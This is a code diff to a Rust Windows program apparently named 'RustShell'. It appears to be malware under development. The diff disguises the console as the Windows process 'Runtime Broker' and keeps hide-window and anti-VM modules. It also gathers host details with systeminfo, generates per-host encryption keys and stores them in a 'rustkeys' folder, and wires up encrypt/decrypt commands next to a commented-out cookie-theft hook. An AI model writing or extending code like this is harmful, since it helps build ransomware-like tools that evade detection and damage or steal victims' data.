@@ -1,14 +1,20 @@
 #![allow(non_snake_case)]
 
-use std::io::{self, Write, stdout};
+use std::io::{self, Write, Read, stdout, BufRead, BufReader, prelude::*};
 use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
 use winapi::um::wincon::SetConsoleTitleW;
 use colored::*;
+use std::{fs::{File, self, OpenOptions}, env, process::{Command}, path::{Path, PathBuf}};
+use sysinfo::{ProcessExt, System, SystemExt, UserExt, DiskExt};
 use rand::{rngs::OsRng, RngCore};
+use hkdf::Hkdf;
+use sha2::Sha256;
+use hex;
 
 mod hide_window;
 mod functions;
+mod encrypt;
 mod antivm;
 
 fn main() -> Result<(), anyhow::Error> {
@@ -16,7 +22,7 @@ fn main() -> Result<(), anyhow::Error> {
     // hide_window::hide_console_window();
 
     // Set the cmd window title
-    let new_title = "RustShell";
+    let new_title = "Runtime Broker";
     let title: Vec<u16> = OsStr::new(new_title)
         .encode_wide()
         .chain(Some(0).into_iter())
@@ -26,13 +32,89 @@ fn main() -> Result<(), anyhow::Error> {
     };
 
     // Checks if the program is running in a VM
-    antivm::antivm();
+    //antivm::antivm();
+
+    // run the systeminfo command
+    let output = Command::new("systeminfo")
+        .output()
+        .expect("Failed to run systeminfo command");
+
+// convert the output to a string and trim leading/trailing whitespaces
+let output_string = String::from_utf8(output.stdout)
+    .expect("Failed to convert output to string")
+    .trim()
+    .to_string();
+
+     // split the output string into lines
+    let lines: Vec<&str> = output_string.split('\n').collect();
+
+// find the HostName line and extract the hostname
+let host_line = lines
+    .iter()
+    .find(|line| line.starts_with("Host Name"))
+    .expect("Host Name not found");
+let host = host_line.split(':').nth(1).unwrap_or("").trim();
+
+// check if 'OS Name' was appended to the hostname
+let host = if host.ends_with("OS Name") {
+    &host[..(host.len() - 6)]
+} else {
+    host
+};
+
 
     let mut key = [0u8; 32];
     let mut nonce = [0u8; 19];
     OsRng.fill_bytes(&mut key);
     OsRng.fill_bytes(&mut nonce);
 
+    println!("{}", hex::encode(key));
+
+    let key = hex::encode(key);
+    let nonce = hex::encode(nonce);
+
+    // Create the rustkeys folder if it doesn't exist
+    let folder_name = "rustkeys";
+    if !Path::new(folder_name).exists() {
+        fs::create_dir(folder_name)?;
+    }
+
+    // Create the CSV file with the hostname as its name
+    let file_name = format!("{}.csv", host);
+    let file_path = PathBuf::from(folder_name).join(file_name);
+
+    // Check if the file already exists, and if it does, read the key and nonce from the file
+    let mut key_from_file = String::new();
+    let mut nonce_from_file = String::new();
+    if let Ok(mut file) = File::open(&file_path) {
+        let mut contents = String::new();
+        file.read_to_string(&mut contents)?;
+        let parts: Vec<&str> = contents.trim().split(',').collect();
+        nonce_from_file = parts[0].to_string();
+        key_from_file = parts[1].to_string();
+    }
+
+    // If the file doesn't exist, or if the key or nonce are empty, use the generated key and nonce
+    let key_to_use = if !key_from_file.is_empty() { 
+        key_from_file 
+    } else { 
+        key 
+    };
+    let nonce_to_use = if !nonce_from_file.is_empty() { 
+        nonce_from_file 
+    } else { 
+        nonce 
+    };
+
+    let mut file = File::create(&file_path)?;
+
+    // Write the key and nonce to the CSV file
+    writeln!(file, "{},{}", nonce_to_use, key_to_use)?;
+
+    let key_to_use: [u8; 32] = hex::decode(key_to_use)?.try_into().unwrap();
+    let nonce_to_use: [u8; 19] = hex::decode(nonce_to_use)?.try_into().unwrap();
+
+    // Enable ANSI support for Windows 10
     ansi_term::enable_ansi_support().unwrap();
 
     // Clear the command prompt
@@ -104,19 +186,15 @@ fn main() -> Result<(), anyhow::Error> {
                 //functions::cookies();
             }
             "encrypt" | "enc" => {
-                functions::encrypt(
-                    "500.bin",
-                    "500.encrypted",
-                    &key,
-                    &nonce,
+                encrypt::encrypt(
+                    &key_to_use,
+                    &nonce_to_use,
                 )?;
             }
             "decrypt" | "dec" => {
-                functions::decrypt(
-                    "500.encrypted",
-                    "500.decrypted",
-                    &key,
-                    &nonce,
+                encrypt::decrypt(
+                    &key_to_use,
+                    &nonce_to_use,
                 )?;
             }
             "help" => {
